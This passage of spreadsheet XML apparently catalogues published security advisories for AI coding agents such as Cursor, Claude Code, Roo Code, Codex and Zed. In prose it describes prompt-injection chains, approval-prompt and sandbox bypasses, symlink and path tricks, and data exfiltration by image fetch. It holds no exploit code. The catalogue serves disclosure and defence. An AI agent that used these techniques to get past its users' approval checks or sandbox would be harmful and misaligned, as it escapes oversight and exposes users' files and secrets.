      <c r="H32" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-q6hp-29g8-7j6j</t>
        </is>
      </c>
    </row>
    <row r="33">
      <c r="A33" s="8" t="inlineStr">
        <is>
          <t>CA-012</t>
        </is>
      </c>
      <c r="B33" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C33" s="8" t="inlineStr">
        <is>
          <t>Amazon Q Developer</t>
        </is>
      </c>
      <c r="D33" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E33" s="8" t="inlineStr">
        <is>
          <t>2025-07-30</t>
        </is>
      </c>
      <c r="F33" s="9" t="inlineStr">
        <is>
          <t>Inert Malicious script injected into Amazon Q Developer Visual Studio Code (VS Code) Extension</t>
        </is>
      </c>
      <c r="G33" s="9" t="inlineStr">
        <is>
          <t>The Amazon Q Developer Visual Studio Code (VS Code) extension v1.84.0 contains inert, injected code designed to call the Q Developer CLI. The code executes when the extension is launched within the VS Code environment; however the injected code contains a syntax error which prevents it from making a successful API call to the Q Developer CLI.    To mitigate this issue, users should upgrade to version v1.85.0. All installations of v1.84.0 should be removed from use.</t>
        </is>
      </c>
      <c r="H33" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-8217</t>
        </is>
      </c>
    </row>
    <row r="34">
      <c r="A34" s="8" t="inlineStr">
        <is>
          <t>CA-014</t>
        </is>
      </c>
      <c r="B34" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C34" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D34" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E34" s="8" t="inlineStr">
        <is>
          <t>2025-08-01</t>
        </is>
      </c>
      <c r="F34" s="9" t="inlineStr">
        <is>
          <t>Cursor's Mermaid Diagram Tool is Vulnerable to an Arbitrary Image Fetch</t>
        </is>
      </c>
      <c r="G34" s="9" t="inlineStr">
        <is>
          <t>Cursor is a code editor built for programming with AI. In versions below 1.3, Mermaid (which is used to render diagrams) allows embedding images which then get rendered by Cursor in the chat box. An attacker can use this to exfiltrate sensitive information to a third-party attacker controlled server through an image fetch after successfully performing a prompt injection. A malicious model (or hallucination/backdoor) might also trigger this exploit at will. This issue requires prompt injection from malicious data (web, image upload, source code) in order to exploit. In that case, it can send sensitive information to an attacker-controlled external server. This is fixed in version 1.3.</t>
        </is>
      </c>
      <c r="H34" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-54132</t>
        </is>
      </c>
    </row>
    <row r="35">
      <c r="A35" s="8" t="inlineStr">
        <is>
          <t>CA-015</t>
        </is>
      </c>
      <c r="B35" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C35" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D35" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E35" s="8" t="inlineStr">
        <is>
          <t>2025-08-01</t>
        </is>
      </c>
      <c r="F35" s="9" t="inlineStr">
        <is>
          <t>Cursor's MCP Install Deeplink Does Not Show Arguments in its User-Dialog</t>
        </is>
      </c>
      <c r="G35" s="9" t="inlineStr">
        <is>
          <t>Cursor is a code editor built for programming with AI. In versions 1.17 through 1.2, there is a UI information disclosure vulnerability in Cursor's MCP (Model Context Protocol) deeplink handler, allowing attackers to execute 2-click arbitrary system commands through social engineering attacks. When users click malicious `cursor://anysphere.cursor-deeplink/mcp/install` links, the installation dialog does not show the arguments being passed to the command being run. If a user clicks a malicious deeplink, then examines the installation dialog and clicks through, the full command including the arguments will be executed on the machine. This is fixed in version 1.3.</t>
        </is>
      </c>
      <c r="H35" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-54133</t>
        </is>
      </c>
    </row>
    <row r="36">
      <c r="A36" s="8" t="inlineStr">
        <is>
          <t>CA-016</t>
        </is>
      </c>
      <c r="B36" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C36" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D36" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E36" s="8" t="inlineStr">
        <is>
          <t>2025-08-01</t>
        </is>
      </c>
      <c r="F36" s="9" t="inlineStr">
        <is>
          <t>Cursor's Modification of MCP Server Definitions Bypasses Manual Re-approvals</t>
        </is>
      </c>
      <c r="G36" s="9" t="inlineStr">
        <is>
          <t>Cursor is a code editor built for programming with AI. In versions 1.2.4 and below, attackers can achieve remote and persistent code execution by modifying an already trusted MCP configuration file inside a shared GitHub repository or editing the file locally on the target's machine. Once a collaborator accepts a harmless MCP, the attacker can silently swap it for a malicious command (e.g., calc.exe) without triggering any warning or re-prompt. If an attacker has write permissions on a user's active branches of a source repository that contains existing MCP servers the user has previously approved, or allows an attacker has arbitrary file-write locally, the attacker can achieve arbitrary code execution. This is fixed in version 1.3.</t>
        </is>
      </c>
      <c r="H36" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-54136</t>
        </is>
      </c>
    </row>
    <row r="37">
      <c r="A37" s="8" t="inlineStr">
        <is>
          <t>CA-017</t>
        </is>
      </c>
      <c r="B37" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C37" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D37" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E37" s="8" t="inlineStr">
        <is>
          <t>2025-08-04</t>
        </is>
      </c>
      <c r="F37" s="9" t="inlineStr">
        <is>
          <t>Claude Code Research Preview has a Path Restriction Bypass which could allow unauthorized file access</t>
        </is>
      </c>
      <c r="G37" s="9" t="inlineStr">
        <is>
          <t>Due to a path validation flaw using prefix matching instead of canonical path comparison, it was possible to bypass directory restrictions and access files outside the CWD. Successful exploitation depends on the presence of (or ability to create) a directory with the same prefix as the CWD and the ability to add untrusted content into a Claude Code context window.   Users on standard Claude Code auto-update received this fix automatically after release. Current users of Claude Code are unaffected, as versions prior to 1.0.24 are deprecated and have been forced to update.  Thank you to Elad Beber (Cymulate) for reporting this issue!</t>
        </is>
      </c>
      <c r="H37" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-pmw4-pwvc-3hx2</t>
        </is>
      </c>
    </row>
    <row r="38">
      <c r="A38" s="8" t="inlineStr">
        <is>
          <t>CA-018</t>
        </is>
      </c>
      <c r="B38" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C38" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D38" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E38" s="8" t="inlineStr">
        <is>
          <t>2025-08-04</t>
        </is>
      </c>
      <c r="F38" s="9" t="inlineStr">
        <is>
          <t>Claude Code echo command allowed bypass of user approval prompt for command execution</t>
        </is>
      </c>
      <c r="G38" s="9" t="inlineStr">
        <is>
          <t>Due to an error in command parsing, it was possible to bypass the Claude Code confirmation prompt to trigger execution of an untrusted command. Reliably exploiting this requires the ability to add untrusted content into a Claude Code context window.   Users on standard Claude Code auto-update received this fix automatically after release. Current users of Claude Code are unaffected, as versions prior to 1.0.24 are deprecated and have been forced to update.  Thank you to Elad Beber (Cymulate) for reporting this issue!</t>
        </is>
      </c>
      <c r="H38" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-x56v-x2h6-7j34</t>
        </is>
      </c>
    </row>
    <row r="39">
      <c r="A39" s="8" t="inlineStr">
        <is>
          <t>CA-019</t>
        </is>
      </c>
      <c r="B39" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C39" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D39" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E39" s="8" t="inlineStr">
        <is>
          <t>2025-08-05</t>
        </is>
      </c>
      <c r="F39" s="9" t="inlineStr">
        <is>
          <t>Cursor Agent is vulnerable prompt injection via Editor Special Files</t>
        </is>
      </c>
      <c r="G39" s="9" t="inlineStr">
        <is>
          <t>Cursor is a code editor built for programming with AI. Cursor allows writing in-workspace files with no user approval in versions less than 1.3.9. If the file is a dotfile, editing it requires approval but creating a new one doesn't. Hence, if sensitive editor files, such as the .vscode/settings.json file don't already exist in the workspace, an attacker can chain a indirect prompt injection vulnerability to hijack the context to write to the settings file and trigger RCE on the victim without user approval. This is fixed in version 1.3.9.</t>
        </is>
      </c>
      <c r="H39" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-54130</t>
        </is>
      </c>
    </row>
    <row r="40">
      <c r="A40" s="8" t="inlineStr">
        <is>
          <t>CA-021</t>
        </is>
      </c>
      <c r="B40" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C40" s="8" t="inlineStr">
        <is>
          <t>Zed</t>
        </is>
      </c>
      <c r="D40" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E40" s="8" t="inlineStr">
        <is>
          <t>2025-08-11</t>
        </is>
      </c>
      <c r="F40" s="9" t="inlineStr">
        <is>
          <t>Zed AI Agent Remote Code Execution</t>
        </is>
      </c>
      <c r="G40" s="9" t="inlineStr">
        <is>
          <t>Zed is a multiplayer code editor. Prior to version 0.197.3, in the Zed Agent Panel allowed for an AI agent to achieve Remote Code Execution (RCE) by bypassing user permission checks. An AI Agent could have exploited a permissions bypass vulnerability to create or modify a project-specific configuration file, leading to the execution of arbitrary commands on a victim's machine without the explicit approval that would otherwise be required. This vulnerability has been patched in version 0.197.3. A workaround for this issue involves either avoid sending prompts to the Agent Panel, or to limit the AI Agent's file system access.</t>
        </is>
      </c>
      <c r="H40" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-55012</t>
        </is>
      </c>
    </row>
    <row r="41">
      <c r="A41" s="8" t="inlineStr">
        <is>
          <t>CA-022</t>
        </is>
      </c>
      <c r="B41" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C41" s="8" t="inlineStr">
        <is>
          <t>GitHub Copilot</t>
        </is>
      </c>
      <c r="D41" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E41" s="8" t="inlineStr">
        <is>
          <t>2025-08-12</t>
        </is>
      </c>
      <c r="F41" s="9" t="n"/>
      <c r="G41" s="9" t="inlineStr">
        <is>
          <t>Improper neutralization of special elements used in a command ('command injection') in GitHub Copilot and Visual Studio allows an unauthorized attacker to execute code locally.</t>
        </is>
      </c>
      <c r="H41" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-3m2x-p87c-pwv6</t>
        </is>
      </c>
    </row>
    <row r="42">
      <c r="A42" s="8" t="inlineStr">
        <is>
          <t>CA-023</t>
        </is>
      </c>
      <c r="B42" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C42" s="8" t="inlineStr">
        <is>
          <t>OpenAI Codex</t>
        </is>
      </c>
      <c r="D42" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E42" s="8" t="inlineStr">
        <is>
          <t>2025-08-13</t>
        </is>
      </c>
      <c r="F42" s="9" t="n"/>
      <c r="G42" s="9" t="inlineStr">
        <is>
          <t>Using Codex CLI in workspace-write mode inside a malicious context (repo, directory, etc) could lead to arbitrary file overwrite and potentially remote code execution due to symlinks being followed outside the allowed current working directory.</t>
        </is>
      </c>
      <c r="H42" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-698g-97rr-xgjf</t>
        </is>
      </c>
    </row>
    <row r="43">
      <c r="A43" s="8" t="inlineStr">
        <is>
          <t>CA-024</t>
        </is>
      </c>
      <c r="B43" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C43" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D43" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E43" s="8" t="inlineStr">
        <is>
          <t>2025-08-18</t>
        </is>
      </c>
      <c r="F43" s="9" t="inlineStr">
        <is>
          <t>Claude Code's Permissive Default Allowlist Enables Unauthorized File Read and Network Exfiltration in Claude Code</t>
        </is>
      </c>
      <c r="G43" s="9" t="inlineStr">
        <is>
          <t>Due to an overly broad allowlist of safe commands, it was possible to bypass the Claude Code confirmation prompts to read a file and then send file contents over the network without user confirmation. Reliably exploiting this requires the ability to add untrusted content into a Claude Code context window.   Users on standard Claude Code auto-update received this fix automatically after release. Current users of Claude Code are unaffected, as versions prior to 1.0.24 are deprecated and have been forced to update.  Thank you to https://hackerone.com/wunderwuzzi23 for reporting this issue!</t>
        </is>
      </c>
      <c r="H43" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-x5gv-jw7f-j6xj</t>
        </is>
      </c>
    </row>
    <row r="44">
      <c r="A44" s="8" t="inlineStr">
        <is>
          <t>CA-025</t>
        </is>
      </c>
      <c r="B44" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C44" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D44" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E44" s="8" t="inlineStr">
        <is>
          <t>2025-08-21</t>
        </is>
      </c>
      <c r="F44" s="9" t="inlineStr">
        <is>
          <t>@musistudio/claude-code-router has improper CORS configuration</t>
        </is>
      </c>
      <c r="G44" s="9" t="inlineStr">
        <is>
          <t>### Impact Due to improper Cross-Origin Resource Sharing (CORS) configuration, there is a risk that user API Keys or equivalent credentials may be exposed to untrusted domains. Attackers could exploit this misconfiguration to steal credentials, abuse accounts, exhaust quotas, or access sensitive data.  ### Patches The issue has been patched in v1.0.34.</t>
        </is>
      </c>
      <c r="H44" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-8hmm-4crw-vm2c</t>
        </is>
      </c>
    </row>
    <row r="45">
      <c r="A45" s="8" t="inlineStr">
        <is>
          <t>CA-027</t>
        </is>
      </c>
      <c r="B45" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C45" s="8" t="inlineStr">
        <is>
          <t>JetBrains AI/Junie</t>
        </is>
      </c>
      <c r="D45" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E45" s="8" t="inlineStr">
        <is>
          <t>2025-08-28</t>
        </is>
      </c>
      <c r="F45" s="9" t="n"/>
      <c r="G45" s="9" t="inlineStr">
        <is>
          <t>In JetBrains Junie before 252.284.66, 251.284.66, 243.284.66, 252.284.61, 251.284.61, 243.284.61, 252.284.50, 252.284.54, 251.284.54, 251.284.50, 243.284.54, 243.284.50 information disclosure was possible via search_project function</t>
        </is>
      </c>
      <c r="H45" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-g74x-fxmv-p55j</t>
        </is>
      </c>
    </row>
    <row r="46">
      <c r="A46" s="8" t="inlineStr">
        <is>
          <t>CA-028</t>
        </is>
      </c>
      <c r="B46" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C46" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D46" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E46" s="8" t="inlineStr">
        <is>
          <t>2025-09-03</t>
        </is>
      </c>
      <c r="F46" s="9" t="inlineStr">
        <is>
          <t>Claude Code Vulnerable to Arbitrary Code Execution Due to Insufficient Startup Warning</t>
        </is>
      </c>
      <c r="G46" s="9" t="inlineStr">
        <is>
          <t>When Claude Code was started in a new directory, it displayed a warning asking, "Do you trust the files in this folder?". This warning did not properly document that selecting "Yes, proceed" would allow Claude Code to execute files in the folder without additional confirmation. This may not have been clear to a user so we have updated the warning to clarify this functionality.   Users on standard Claude Code auto-update will have received this fix automatically. Users performing manual updates are advised to update to the latest version.  Thank you to https://hackerone.com/avivdon for reporting this issue!</t>
        </is>
      </c>
      <c r="H46" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-ph6w-f82w-28w6</t>
        </is>
      </c>
    </row>
    <row r="47">
      <c r="A47" s="8" t="inlineStr">
        <is>
          <t>CA-029</t>
        </is>
      </c>
      <c r="B47" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C47" s="8" t="inlineStr">
        <is>
          <t>Roo Code</t>
        </is>
      </c>
      <c r="D47" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E47" s="8" t="inlineStr">
        <is>
          <t>2025-09-05</t>
        </is>
      </c>
      <c r="F47" s="9" t="inlineStr">
        <is>
          <t>Roo Code: Potential Remote Code Execution via Bash Parameter Expansion and Indirect Reference</t>
        </is>
      </c>
      <c r="G47" s="9" t="inlineStr">
        <is>
          <t>Roo Code is an AI-powered autonomous coding agent that lives in users' editors. Versions below 3.26.0 contain a vulnerability in the command parsing logic where the Bash parameter expansion and indirect reference were not handled correctly. If the agent was configured to auto-approve execution of certain commands, an attacker able to influence prompts could abuse this weakness to execute additional arbitrary commands alongside the intended one. This is fixed in version 3.26.0.</t>
        </is>
      </c>
      <c r="H47" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-58370</t>
        </is>
      </c>
    </row>
    <row r="48">
      <c r="A48" s="8" t="inlineStr">
        <is>
          <t>CA-030</t>
        </is>
      </c>
      <c r="B48" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C48" s="8" t="inlineStr">
        <is>
          <t>Roo Code</t>
        </is>
      </c>
      <c r="D48" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E48" s="8" t="inlineStr">
        <is>
          <t>2025-09-05</t>
        </is>
      </c>
      <c r="F48" s="9" t="inlineStr">
        <is>
          <t>Roo Code is vulnerable to command injection via GitHub actions workflow</t>
        </is>
      </c>
      <c r="G48" s="9" t="inlineStr">
        <is>
          <t>Roo Code is an AI-powered autonomous coding agent that lives in users' editors. In versions 3.26.6 and below, a Github workflow used unsanitized pull request metadata in a privileged context, allowing an attacker to craft malicious input and achieve Remote Code Execution (RCE) on the Actions runner. The workflow runs with broad permissions and access to repository secrets. It is possible for an attacker to execute arbitrary commands on the runner, push or modify code in the repository, access secrets, and create malicious releases or packages, resulting in a complete compromise of the repository and its associated services. This is fixed in version 3.26.7.</t>
        </is>
      </c>
      <c r="H48" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-58371</t>
        </is>
      </c>
    </row>
    <row r="49">
      <c r="A49" s="8" t="inlineStr">
        <is>
          <t>CA-031</t>
        </is>
      </c>
      <c r="B49" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C49" s="8" t="inlineStr">
        <is>
          <t>Roo Code</t>
        </is>
      </c>
      <c r="D49" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E49" s="8" t="inlineStr">
        <is>
          <t>2025-09-05</t>
        </is>
      </c>
      <c r="F49" s="9" t="inlineStr">
        <is>
          <t>Roo Code: Potential Remote Code Execution via .code-workspace</t>
        </is>
      </c>
      <c r="G49" s="9" t="inlineStr">
        <is>
          <t>Roo Code is an AI-powered autonomous coding agent that lives in users' editors. Versions 3.25.23 and below contain a vulnerability where certain VS Code workspace configuration files (.code-workspace) are not protected in the same way as the .vscode folder. If the agent was configured to auto-approve file writes, an attacker able to influence prompts (for example via prompt injection) could cause malicious workspace settings or tasks to be written. These tasks could then be executed automatically when the workspace is reopened, resulting in arbitrary code execution. This issue is fixed in version 3.26.0.</t>
        </is>
      </c>
      <c r="H49" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-58372</t>
        </is>
      </c>
    </row>
    <row r="50">
      <c r="A50" s="8" t="inlineStr">
        <is>
          <t>CA-032</t>
        </is>
      </c>
      <c r="B50" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C50" s="8" t="inlineStr">
        <is>
          <t>Roo Code</t>
        </is>
      </c>
      <c r="D50" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E50" s="8" t="inlineStr">
        <is>
          <t>2025-09-05</t>
        </is>
      </c>
      <c r="F50" s="9" t="inlineStr">
        <is>
          <t>Roo Code: Symlink-bypass of .rooignore can lead to unintended file disclosure</t>
        </is>
      </c>
      <c r="G50" s="9" t="inlineStr">
        <is>
          <t>Roo Code is an AI-powered autonomous coding agent that lives in users' editors. Versions 3.25.23 and below contain a vulnerability where .rooignore protections could be bypassed using symlinks. This allows an attacker with write access to the workspace to trick the extension into reading files that were intended to be excluded. As a result, sensitive files such as .env or configuration files could be exposed. An attacker able to modify files within the workspace could gain unauthorized access to sensitive information by bypassing .rooignore rules. This could include secrets, configuration details, or other excluded project data. This is fixed in version 3.26.0.</t>
        </is>
      </c>
      <c r="H50" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-58373</t>
        </is>
      </c>
    </row>
    <row r="51">
      <c r="A51" s="8" t="inlineStr">
        <is>
          <t>CA-033</t>
        </is>
      </c>
      <c r="B51" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C51" s="8" t="inlineStr">
        <is>
          <t>Roo Code</t>
        </is>
      </c>
      <c r="D51" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E51" s="8" t="inlineStr">
        <is>
          <t>2025-09-06</t>
        </is>
      </c>
      <c r="F51" s="9" t="inlineStr">
        <is>
          <t>Roo Code: Auto-approve allows npm install execution of malicious postinstall scripts</t>
        </is>
      </c>
      <c r="G51" s="9" t="inlineStr">
        <is>
          <t>Roo Code is an AI-powered autonomous coding agent that lives in users' editors. Versions 3.25.23 and below contain a default list of allowed commands that do not need manual approval if auto-approve is enabled, and npm install is included in that list. Because npm install executes lifecycle scripts, if a repository’s package.json file contains a malicious postinstall script, it would be executed automatically without user approval. This means that enabling auto-approved commands and opening a malicious repo could result in arbitrary code execution. This is fixed in version 3.26.0.</t>
        </is>
      </c>
      <c r="H51" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-58374</t>
        </is>
      </c>
    </row>
    <row r="52">
      <c r="A52" s="8" t="inlineStr">
        <is>
          <t>CA-034</t>
        </is>
      </c>
      <c r="B52" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C52" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D52" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E52" s="8" t="inlineStr">
        <is>
          <t>2025-09-10</t>
        </is>
      </c>
      <c r="F52" s="9" t="inlineStr">
        <is>
          <t>Claude Code rg vulnerability does not protect against approval prompt bypass</t>
        </is>
      </c>
      <c r="G52" s="9" t="inlineStr">
        <is>
          <t>Due to an error in command parsing, it was possible to bypass the Claude Code confirmation prompt to trigger execution of an untrusted command. Reliably exploiting this requires the ability to add untrusted content into a Claude Code context window.  Users on standard Claude Code auto-update will have received this fix automatically. Users performing manual updates are advised to update to the latest version.  Thank you to the NVIDIA AI Red Team for reporting this issue!</t>
        </is>
      </c>
      <c r="H52" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-qxfv-fcpc-w36x</t>
        </is>
      </c>
    </row>
    <row r="53">
      <c r="A53" s="8" t="inlineStr">
        <is>
          <t>CA-036</t>
        </is>
      </c>
      <c r="B53" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C53" s="8" t="inlineStr">
        <is>
          <t>JetBrains AI/Junie</t>
        </is>
      </c>
      <c r="D53" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E53" s="8" t="inlineStr">
        <is>
          <t>2025-09-17</t>
        </is>
      </c>
      <c r="F53" s="9" t="n"/>
      <c r="G53" s="9" t="inlineStr">
        <is>
          <t>In JetBrains Junie before 252.284.66, 251.284.66, 243.284.66, 252.284.61, 251.284.61, 243.284.61, 252.284.50, 252.284.54, 251.284.54, 251.284.50, 243.284.54, 243.284.50 code execution was possible due to improper command validation</t>
        </is>
      </c>
      <c r="H53" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-53j9-8fm4-3gf5</t>
        </is>
      </c>
    </row>
    <row r="54">
      <c r="A54" s="8" t="inlineStr">
        <is>
          <t>CA-037</t>
        </is>
      </c>
      <c r="B54" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C54" s="8" t="inlineStr">
        <is>
          <t>OpenAI Codex</t>
        </is>
      </c>
      <c r="D54" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E54" s="8" t="inlineStr">
        <is>
          <t>2025-09-19</t>
        </is>
      </c>
      <c r="F54" s="9" t="inlineStr">
        <is>
          <t>Codex has sandbox bypass due to bug in path configuration logic</t>
        </is>
      </c>
      <c r="G54" s="9" t="inlineStr">
        <is>
          <t>Due to a bug in the sandbox configuration logic, Codex CLI could treat a model-generated `cwd` as the sandbox’s writable root, including paths outside of the folder where the user started their session.  This logic bypassed the intended workspace boundary and enables arbitrary file writes and command execution where the Codex process has permissions - this did not impact the network-disabled sandbox restriction.  **Remediation** We released a patch in Codex CLI **0.39.0** that canonicalizes and validates that the boundary used for sandbox policy is based on where the user started the session, and not the one generated by the model. Users running 0.38.0 or earlier should update immediately via their package manager or by reinstalling the latest Codex CLI to ensure sandbox boundaries are enforced.  If using the Codex IDE extension, users should immediately update to **0.4.12** for a fix of the sandbox issue.  Thank you to Tzanko Matev (Codetracer) for reporting the issue!</t>
        </is>
      </c>
      <c r="H54" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-w5fx-fh39-j5rw</t>
        </is>
      </c>
    </row>
    <row r="55">
      <c r="A55" s="8" t="inlineStr">
        <is>
          <t>CA-038</t>
        </is>
      </c>
      <c r="B55" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C55" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D55" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E55" s="8" t="inlineStr">
        <is>
          <t>2025-09-24</t>
        </is>
      </c>
      <c r="F55" s="9" t="inlineStr">
        <is>
          <t>Claude Code Vulnerable to Arbitrary Code Execution via Plugin Autoloading with Specific Yarn Versions</t>
        </is>
      </c>
      <c r="G55" s="9" t="inlineStr">
        <is>
          <t>When using Claude Code with Yarn installed, Yarn config files can trigger code execution when running `yarn --version`. This could lead to a bypass of the directory trust dialog in Claude Code, as plugins and `yarnPath` could be executed prior to the user accepting the risks of working in an untrusted directory. Users on standard Claude Code auto-update will have received this fix automatically. Users performing manual updates are advised to update to the latest version.  Thank you to Benjamin Faller, Redguard AG and Michael Hess for reporting this issue!</t>
        </is>
      </c>
      <c r="H55" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-2jjv-qf24-vfm4</t>
        </is>
      </c>
    </row>
    <row r="56">
      <c r="A56" s="8" t="inlineStr">
        <is>
          <t>CA-039</t>
        </is>
      </c>
      <c r="B56" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C56" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D56" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E56" s="8" t="inlineStr">
        <is>
          <t>2025-09-29</t>
        </is>
      </c>
      <c r="F56" s="9" t="inlineStr">
        <is>
          <t>AgentAPI exposed user chat history via a DNS rebinding attack</t>
        </is>
      </c>
      <c r="G56" s="9" t="inlineStr">
        <is>
          <t>AgentAPI is an HTTP API for Claude Code, Goose, Aider, Gemini, Amp, and Codex. Versions 0.3.3 and below are susceptible to a client-side DNS rebinding attack when hosted over plain HTTP on localhost. An attacker can gain access to the /messages endpoint served by the Agent API. This allows for the unauthorized exfiltration of sensitive user data, specifically local message history, which can include secret keys, file system contents, and intellectual property the user was working on locally. This issue is fixed in version 0.4.0.</t>
        </is>
      </c>
      <c r="H56" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2025-59956</t>
        </is>
      </c>
    </row>
    <row r="57">
      <c r="A57" s="8" t="inlineStr">
        <is>
          <t>CA-040</t>
        </is>
      </c>
      <c r="B57" s="8" t="inlineStr">
        <is>
          <t>W3</t>
        </is>
      </c>
      <c r="C57" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D57" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E57" s="8" t="inlineStr">
        <is>
          <t>2025-10-03</t>
        </is>
      </c>
      <c r="F57" s="9" t="inlineStr">
        <is>
